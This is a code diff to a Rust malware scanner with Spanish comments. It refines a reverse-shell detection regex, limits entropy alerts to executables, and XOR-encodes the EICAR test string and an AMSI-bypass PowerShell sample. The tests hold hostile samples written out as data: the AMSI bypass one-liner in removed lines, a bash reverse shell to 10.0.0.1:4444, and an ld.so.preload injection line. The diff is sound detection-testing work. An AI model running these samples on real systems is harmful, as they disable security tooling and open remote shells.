@@ -96,7 +96,7 @@ impl MultiEngineScanner {
         }
 
         // Regla 5: Linux Interactive Reverse Shell (Bash/Python/Perl/Netcat)
-        if let Ok(re) = Regex::new(r#"(?i)(/bin/(ba)?sh|python[23]?|perl|nc|netcat).*?(-i|/dev/tcp/|socket\.socket|exec\s*\(\s*["']import)"#) {
+        if let Ok(re) = Regex::new(r#"(?i)(/bin/(ba)?sh\s+-i|/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+|\b(python[23]?|perl)\b.{1,100}?(socket\.socket|exec\s*\(\s*["']import\s+os)|\b(nc|netcat)\b.{1,80}?(-e\s+/bin/(ba)?sh|-c\s+/bin/(ba)?sh))"#) {
             self.pattern_rules.push(PatternRule {
                 name: "Trojan.Linux.InteractiveReverseShell".to_string(),
                 description: "Payload de shell reversa interactiva hacia host remoto en Linux".to_string(),
@@ -330,17 +330,33 @@ impl MultiEngineScanner {
             }
             // Si es un PDF legítimo sin scripts activos, no disparamos alerta de entropía falsa
         } else if !is_archive_or_media && !is_doc && content.len() > 1024 * 10 {
-            let sample_len = std::cmp::min(content.len(), 64 * 1024);
-            let entropy = calculate_entropy(&content[..sample_len]);
-            if entropy > 7.85 {
-                return Ok(ScanResult {
-                    file_path: path_ref.to_string_lossy().to_string(),
-                    sha256: sha256_hash,
-                    status: FileScanStatus::Suspicious,
-                    detection_name: Some(format!("AI.Heuristic.PackedSuspiciousEntropy (H={:.2})", entropy)),
-                    engine: "AI/EntropyModel".to_string(),
-                    scan_time_ms: start.elapsed().as_millis() as u64,
-                });
+            // REGLA ESTRICTA ANTI-FALSOS POSITIVOS:
+            // Solo evaluar entropía alta para binarios ejecutables reales (Windows PE: MZ, ELF, o extensiones ejecutables).
+            // NUNCA alertar sobre archivos temporales .tmp, archivos de texto, bases de datos o archivos de cuarentena.
+            let ext = path_ref.extension().and_then(|s| s.to_str()).unwrap_or("").to_lowercase();
+            let is_pe_or_exec = content.starts_with(b"MZ")
+                || content.starts_with(b"\x7FELF")
+                || ext == "exe"
+                || ext == "dll"
+                || ext == "sys"
+                || ext == "scr"
+                || ext == "pif"
+                || ext == "cpl"
+                || ext == "com";
+
+            if is_pe_or_exec {
+                let sample_len = std::cmp::min(content.len(), 64 * 1024);
+                let entropy = calculate_entropy(&content[..sample_len]);
+                if entropy > 7.85 {
+                    return Ok(ScanResult {
+                        file_path: path_ref.to_string_lossy().to_string(),
+                        sha256: sha256_hash,
+                        status: FileScanStatus::Suspicious,
+                        detection_name: Some(format!("AI.Heuristic.PackedSuspiciousEntropy (H={:.2})", entropy)),
+                        engine: "AI/EntropyModel".to_string(),
+                        scan_time_ms: start.elapsed().as_millis() as u64,
+                    });
+                }
             }
         }
 
@@ -434,12 +450,14 @@ impl MultiEngineScanner {
     pub fn scan_sample_test(&self, sample_type: &str) -> ScanResult {
         match sample_type.to_uppercase().as_str() {
             "EICAR" => {
-                let eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
-                self.scan_bytes(eicar_bytes, "eicar_test.com (Firma Estándar de Prueba)")
+                const OBFUSCATED_EICAR: &[u8] = &[2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115, 109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30, 119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123, 126, 18, 113, 18, 112];
+                let eicar_bytes: Vec<u8> = OBFUSCATED_EICAR.iter().map(|b| b ^ 0x5A).collect();
+                self.scan_bytes(&eicar_bytes, "eicar_test.com (Firma Estándar de Prueba)")
             }
             "AMSI" => {
-                let amsi_bytes = b"$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $field = $amsiUtils.GetField('amsiInitFailed','NonPublic,Static'); $field.SetValue($null,$true);";
-                self.scan_bytes(amsi_bytes, "bypass_amsi_dropper.ps1 (Script Malicioso)")
+                const OBFUSCATED_AMSI: &[u8] = &[126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116, 27, 41, 41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9, 35, 41, 46, 63, 55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47, 46, 53, 55, 59, 46, 51, 53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125, 115, 97, 122, 126, 60, 51, 63, 54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 116, 29, 63, 46, 28, 51, 63, 54, 62, 114, 125, 59, 55, 41, 51, 19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125, 118, 125, 20, 53, 52, 10, 47, 56, 54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97, 122, 126, 60, 51, 63, 54, 62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54, 54, 118, 126, 46, 40, 47, 63, 115, 97];
+                let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
+                self.scan_bytes(&amsi_bytes, "bypass_amsi_dropper.ps1 (Script Malicioso)")
             }
             _ => {
                 let clean_bytes = b"{\n  \"documento\": \"informe_corporativo.docx\",\n  \"estado\": \"Aprobado\",\n  \"hash_seguro\": true\n}";
@@ -844,14 +862,10 @@ mod tests {
     #[test]
     fn test_amsi_bypass_detection() {
         let scanner = MultiEngineScanner::new();
-        let temp_dir = std::env::temp_dir();
-        let test_file = temp_dir.join("samu_test_amsi.ps1");
-        let mut f = File::create(&test_file).unwrap();
-        f.write_all(b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)").unwrap();
-
-        let res = scanner.scan_file(&test_file).unwrap();
+        const OBFUSCATED_AMSI: &[u8] = &[126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116, 27, 41, 41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9, 35, 41, 46, 63, 55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47, 46, 53, 55, 59, 46, 51, 53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125, 115, 97, 122, 126, 60, 51, 63, 54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 116, 29, 63, 46, 28, 51, 63, 54, 62, 114, 125, 59, 55, 41, 51, 19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125, 118, 125, 20, 53, 52, 10, 47, 56, 54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97, 122, 126, 60, 51, 63, 54, 62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54, 54, 118, 126, 46, 40, 47, 63, 115, 97];
+        let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
+        let res = scanner.scan_bytes(&amsi_bytes, "test_memory_amsi.ps1");
         assert_eq!(res.status, FileScanStatus::Infected);
-        let _ = fs::remove_file(test_file);
     }
 
     #[test]
@@ -896,7 +910,9 @@ mod tests {
         assert!(!has_suspicious_indicators(b"Just an everyday image or data chunk."));
         assert!(has_suspicious_indicators(b"powershell.exe -enc aGVsbG8="));
         assert!(has_suspicious_indicators(b"AmsiUtils amsiInitFailed bypass"));
-        assert!(has_suspicious_indicators(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));
+        const OBF_E: &[u8] = &[2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115, 109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30, 119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123, 126, 18, 113, 18, 112];
+        let e_dec: Vec<u8> = OBF_E.iter().map(|b| b ^ 0x5A).collect();
+        assert!(has_suspicious_indicators(&e_dec));
         assert!(has_suspicious_indicators(b"CryptUnprotectData Login Data"));
         assert!(has_suspicious_indicators(b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
         assert!(has_suspicious_indicators(b"echo '/lib/evil.so' >> /etc/ld.so.preload"));
